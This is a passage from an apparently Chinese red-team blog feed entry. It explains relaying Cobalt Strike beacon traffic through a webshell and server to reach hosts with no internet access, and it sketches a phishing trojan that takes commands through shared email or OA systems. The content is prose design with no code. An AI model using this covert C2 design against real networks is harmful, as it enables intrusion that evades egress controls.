/></p><p>server端：</p><ul><li>beacon将http请求(假设数据为AAAAAA)发送到server。</li><li>server将(AAAAAA)存储到缓存，并保持与beacon的http连接。</li></ul><p>client端：</p><ul><li>请求webshell。</li><li>webshell转发请求到server。</li><li>server将缓存的(AAAAA)填充到http应答中。</li><li>webshell将server的应答转发给client。</li><li>client从应答中获取数据(AAAAA)。</li><li>client与cobaltstike的listener建立tcp连接。</li><li>client发送(AAAAA)到cobaltstrike的listener。</li><li>conbaltstrike发送应答数据(BBBBBB)。</li><li>client将数据(BBBBB)封装到http请求中,通过webshell转发到server。</li><li>server通过之前保持的http连接将(BBBBBB)发送到beacon。</li></ul><p>实际的流程就是数据包的转换和转发，理解完上面的正向，反向的逻辑只是增加了一个监听而已。</p><p>可能会有人有这样的问题：<strong>这里的webshell可以类似reg把server也整合一下吗，不落地server？</strong></p><p>答案是不行的，区别于正向连接，反向连接时需要监听端口，webshell是无法做到的，所以使用毒刺的时候，不出网的机器需要落地两个文件（webshell、server）</p><h2 id="0x03实战钓鱼不出网上线"><a class="markdownIt-Anchor" href="#0x03实战钓鱼不出网上线"></a> 0x03实战钓鱼不出网上线</h2><p>根据上面的不出网上线cs案例解释，其实主要做的就是流量转发和格式化</p><p>格式化的部分就是毒刺的client和server在做，但是这样会在webshell的机器上落地sever的二进制文件，同时需要开启监听，不够opsec。</p><p>不妨把思路发散一下：有没有可能把server和c2马绑在一起呢？或者换句话说，我们可以重新写我们的c2马，直接把结果写入到webshell缓存中，c2的控制端会请求webshell获取缓存读取结果，就完成了不出网的上线流程。</p><p>这个案例其实之前项目遇见过：</p><p><strong>钓鱼的时候，机器不出网如何上线？？</strong></p><p>找内外网可能互通的业务：邮件系统、OA系统等（可能需要账号，但是这些系统大概率内外网是互通的），或者直接摆烂，找能做数据交互的系统域名，批量都试一下。</p><p>对应我们上面的思路，重新设计我们的c2马和服务端，或者没那么麻烦，自己写一个能执行命令、文件上传和读取的马就可以了。</p><p>木马：</p><ul><li><p>定时读取邮件、OA系统或者其他能存储数据的系统的数据。（如邮件内容，系统编辑内容、oa聊天记录等等），作为命令输入。</p></li><li><p>获取命令输入后将执行结果写入对应系统。</p></li></ul><p>因为内外网系统互通</p><p>c2控制端：</p><ul><li>将想执行的命令写入到外网系统，供木马读取</li><li>将木马执行结果读取并响应</li></ul><p>实战应用的话，其实还是可以用的。</p><p>机器不出网的话，肯定会配内部dns，所以去外网找可以存储数据的系统域名，写木马的时候加上批量的逻辑if else尝试所有可能的域名，保证稳定获取结果就可以了。</p><p>参考连接：</p><p>（红队攻防实践：不出网主机搭建内网隧道新思路）<a href="https://mp.weixin.qq.com/s/WzXztQoiqBec-y23dRj0ww">https://mp.weixin.qq.com/s/WzXztQoiqBec-y23dRj0ww</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先简单带一下常见的正向HTTP隧道&lt;/p&gt;
&lt;h2 id=&quot;0x01正向http隧道&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01正向http隧道&quot;&gt;&lt;/a&gt; 0x01正向HTTP隧道&lt;/h2&gt;
&lt;p&gt;这种方式应用范围很广，有websh</summary>
      
    
    
    
    
    <category term="不出网利用" scheme="https://cyxsec.github.io/tags/%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
</feed>
